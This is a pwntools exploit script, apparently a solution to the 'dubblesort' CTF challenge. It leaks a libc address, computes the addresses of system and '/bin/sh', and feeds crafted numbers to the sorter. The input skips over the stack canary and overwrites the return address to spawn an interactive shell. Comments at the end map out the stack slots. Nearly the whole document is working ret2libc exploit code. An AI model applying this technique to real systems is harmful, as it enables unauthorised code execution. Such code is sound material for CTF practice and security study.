from pwn import*
s=process("./dubblesort")
pause()
print(s.recv(1024))
s.send("a"*11+"\n")
leak=s.recv(1024)
libc_leak=u32(leak[0x12:0x16])
system=libc_leak-0xf7e0e4a9+0xf7e1b200
sh=libc_leak-0xf7e0e4a9+0xf7f5c0cf
print(hex(libc_leak))
print(hex(system))
print(hex(sh))
count=46
s.send(str(count)+"\n")
#print(s.recv(1024))
#s.send("\x00\n")
for i in range(1,count+1):
	if i in range(1,7):
		s.send("4026531840\n")
	elif i==7:
		s.send(str(sh+10)+"\n")
	elif i==8:
		s.send(str(system)+"\n")
	elif i==9:
		s.send(str(sh)+"\n")
	elif i==10:
		s.send(str((system+sh)//2)+"\n")
	elif i==25:
		s.send("a")
	else:
		s.send("1\n")

	print(s.recv(1024))

#print(s.recv(1024))
s.interactive()
s.close()


#with error, no input!

#double sort!

#25: canary, #33: ret
#25<->3, 33: we can write


"""
residue:1
24 -> to 56558b2b
25: canary
26: f7fe59b0 ->to 37
27: 0 
28: 56558b2b
29: 0
30: f7fb6000 -> to 36
31: 0
32: 0 
33: we write(ret) 0xf7e1b200
34: middle
35: /bin/sh 0xf7f5c0cf
36:
37: 
"""
# 1~24: 1
# 25: another
# 26, 27, 28, 29, 30, 31, 32 : 7

